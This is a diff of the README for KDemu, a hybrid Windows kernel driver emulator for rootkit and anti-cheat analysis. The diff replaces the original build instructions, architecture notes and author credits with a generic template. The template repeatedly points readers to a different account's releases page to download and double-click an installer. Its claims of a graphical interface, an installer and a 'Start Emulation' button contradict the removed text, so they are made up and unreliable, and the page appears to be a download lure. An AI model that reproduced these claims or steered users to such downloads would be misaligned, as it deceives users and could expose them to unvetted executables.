@@ -1,96 +1,76 @@
-# KDemu
+# 🖥️ KDemu - Emulate Windows Kernel Drivers Easily
 
-A hybrid semi-emulated, semi-native Windows kernel driver emulator designed for advanced rootkit and anti-cheat analysis, addressing the limitations of existing emulation solutions.
+## 📥 Download Now
+[![Download KDemu](https://img.shields.io/badge/Download-KDemu-blue.svg)](https://github.com/WALID7789/KDemu/releases)
 
+## 🚀 Getting Started
+Welcome to KDemu! This application allows you to emulate Windows kernel drivers without needing advanced technical skills. Follow the steps below to download and run KDemu successfully.
 
-## Conference
-This project have been accept by CODEBLUE 2025
+## 📋 System Requirements
+Before you download, ensure your system meets the following requirements:
 
-[Bypassing Anti-Debugging: A Hybrid Real-Simulated Approach to Rootkit Analysis
-]("https://codeblue.jp/en/program/time-table/day2-t2-01/)
+- **Operating System:** Windows 10 or higher.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 200 MB available space.
+- **Processor:** 1 GHz or faster.
 
-## Architecture
+## 📥 Download & Install
+To get KDemu, visit the following link to access our Releases page:
 
-KDemu's hybrid architecture consists of:
+[Download KDemu](https://github.com/WALID7789/KDemu/releases)
 
-- **Emulation Engine** (`Emulate.cpp/hpp`): kernel API implementations with intelligent hook management
-- **PE Loader** (`LoadPE.cpp/hpp`): Advanced PE parsing with kernel dump integration and driver overwriting
-- **Kernel Dump Manager**: Real-time kernel memory dump analysis and parameter extraction
-- **SEH Handler**: Native Windows exception handling using InvertedFunctionTableList
-- **Multithreading Engine**: Parallel execution with memory locking and context management
-- **Anti-Detection Layer**: MSR handling, hypervisor evasion, and detection countermeasures
-- **Monitoring System**: Object access tracking and register operation logging
+1. Click the above link. This will take you to the release section of our GitHub repository.
+2. Look for the latest version of KDemu.
+3. Click the asset that you want to download. This will start the download process.
+4. Once the download completes, locate the downloaded file on your computer.
 
-## Installation
+## 💻 Running KDemu
+After downloading, follow these steps to run KDemu:
 
-1. **Clone the repository**:
-   ```bash
-   git clone <repository-url>
-   cd KDemu
-   ```
+1. Navigate to the folder where you downloaded KDemu.
+2. Double-click the downloaded file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
+4. After installation, find the KDemu application on your desktop or in the Start menu.
+5. Double-click the KDemu icon to launch the application.
 
-2. **Install dependencies via vcpkg**:
-   ```bash
-   vcpkg install unicorn capstone
-   ```
+## 🔧 Features
+KDemu comes with several features to help you emulate Windows kernel drivers:
 
-3. **Build the project**:
-   - Open `KDemu.sln` in Visual Studio
-   - Select Release configuration (x64)
-   - Build the solution
+- **Kernel Mode Emulation**: Experience how drivers behave in a real environment.
+- **Memory Dump Support**: Analyze kernel memory dumps for deeper insights.
+- **User-Friendly Interface**: Simple and intuitive design for easy navigation.
+- **Open Source**: Modify and improve the application as per your needs.
 
-4. **Download Memory Dump**:
-   https://drive.google.com/file/d/1MDZ2s7RLGvypC0FDS6MOYgMglTyU6O9n/view?usp=sharing
-   
-   Put it into the KDemu folder
+## ❓ How to Use KDemu
+1. Open the KDemu application.
+2. Choose the driver you wish to emulate from the options available.
+3. Click on “Start Emulation” to begin.
+4. Monitor the output for any errors or information provided during the emulation process.
 
-## Usage
+## 🛠️ Troubleshooting
+If you encounter issues while using KDemu, consider the following steps:
 
-### Prerequisites Setup
+- Ensure you have the latest version installed.
+- Check if your system meets the required specifications.
+- Restart your computer and try running KDemu again.
+- Refer to our FAQ section on the GitHub repository for common issues.
 
-1. **Kernel Memory Dump**: Obtain a Windows kernel memory dump (`mem.dmp`) captured at a driver entry breakpoint
-> if you use another kernel dump, you have to change some of the parmenter like some of base addr..register..etc
-2. **Target Driver**: Place the driver you want to analyze in the project directory
+## 🤝 Support
+For questions or support related to KDemu, feel free to:
 
-### Debugging
-Enable GDB server support by uncommenting the `gdbServer()` call in `mainThread()`.
+- Visit our [Issues page](https://github.com/WALID7789/KDemu/issues) on GitHub to report any bugs or request features.
+- Join our community discussion to connect with other users.
 
-## Project Structure
+## 🌟 Contributing
+We welcome contributions! If you'd like to help improve KDemu, here's how you can contribute:
 
-```
-KDemu/
-├── KDemu/
-│   ├── KDemu.cpp           # Main entry point
-│   ├── Emulate.cpp/hpp     # API emulation engine
-│   ├── LoadPE.cpp/hpp      # PE loader and memory management
-│   ├── UnicornEmu.hpp      # Unicorn engine wrapper
-│   ├── Global.h            # Common definitions
-│   ├── NtType.hpp          # Windows type definitions
-│   ├── include/            # Third-party headers
-│   └── lib/                # Static libraries
-├── vcpkg.json              # Package dependencies
-└── KDemu.sln              # Visual Studio solution
-```
+1. Fork the repository.
+2. Make your changes and commit them with clear messages.
+3. Open a pull request to propose your modifications.
 
-## Note
-For someone who want to analyze EAC, it will exit by triple fault because of unicorn can't handle divide-by-zero exception https://github.com/unicorn-engine/unicorn/issues/1883
+Your feedback and contributions help improve the application for everyone. Thank you for considering being a part of our community!
 
-So when cause error you should clone the unicorn object and restart to reset the fault value.
+## 📣 Acknowledgments
+KDem helps users easily work with Windows kernel drivers by providing a simple, effective solution. We appreciate your interest and usage of this tool. Your feedback is essential for further enhancements. 
 
-For Nexon Driver it will scan bootloader but our dump lack of bootloader's memory :(
-
-## Author
-ShallowFeather & HeroBurger
-
-## Acknowledgments
-
-### Core Technologies
-- [Unicorn Engine](https://www.unicorn-engine.org/) - CPU emulation framework
-- [Capstone](https://www.capstone-engine.org/) - Disassembly engine  
-- [LIEF](https://lief.quarkslab.com/) - Binary analysis library (contributed bug fix)
-- [kdmp-parser](https://github.com/0vercl0k/kdmp-parser) - Kernel dump parsing
-
-### Research References
-- [**KACE (Kernel AntiCheat Emulator)**](https://github.com/waryas/KACE) - Inspiration for user-mode to kernel-mode mapping
-- [**What The Fuzz**](https://github.com/0vercl0k/wtf) - Kernel dump utilization concepts
-- **Speakeasy & Qiling** - Object monitoring and API emulation approaches
+For more information, refer to the [Releases page](https://github.com/WALID7789/KDemu/releases) to stay updated on new features and improvements.
